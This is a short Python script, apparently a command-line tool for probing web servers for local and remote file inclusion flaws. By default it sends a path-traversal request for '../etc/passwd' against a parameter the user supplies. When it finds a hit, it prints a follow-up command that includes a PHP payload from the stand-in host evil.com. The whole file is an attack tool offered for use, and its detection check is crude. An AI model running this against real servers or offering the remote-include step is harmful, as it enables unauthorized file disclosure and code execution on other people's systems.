import argparse
import requests

def command_parse ():
    parser = argparse.ArgumentParser(description='This tool if used for test lfi/rfi vulnerabilities on web server. app.py --mode lfi --url http://target.com --pm=?lang= --tf=.passwd')
    parser.add_argument('-m', '--mode', help='mode of attack (lfi or rfi) the default mode is lfi')
    parser.add_argument('-u', '--url', help='target url')
    parser.add_argument('-p', '--pm', help='vulnerable param on url')
    parser.add_argument('-f', '--file', help='target file, default file is ../etc/passwd')
    args = parser.parse_args()
    if args.mode is None:
        args.mode = 'lfi'
    if args.url is None:
        print("Command error: url is not provided")
    if args.pm is None:
        print("Command error: param is not provided")
    if args.file is None:
        args.file='../etc/passwd'
    return [args.mode, args.url, args.pm, args.file]

cmd = command_parse()

if(cmd[0]=='lfi'):
    lfi_target_uri="{}{}{}".format(cmd[1], cmd[2], cmd[3])
    res = requests.get(lfi_target_uri)
    if res.status_code == 200 :
        if 'include({}'.format(cmd[3]) in res.text:
            print('LFI vuln is found on this server for this target url: {}'.format(lfi_target_uri))
            print('----------------------------------------------------------------')
            print('Do you want to perform an attack to redirect to you local payload ?')
            print('run: app.py --mode lfi -url {}{}{}'.format(cmd[1], cmd[2],'http://evil.com/yourOwnFile.php'))
        else:
            print('Sorry LFI vuln is not found on this server for this target url: {}'.format(lfi_target_uri))
    else :
        print("The request get status code :", res.status_code)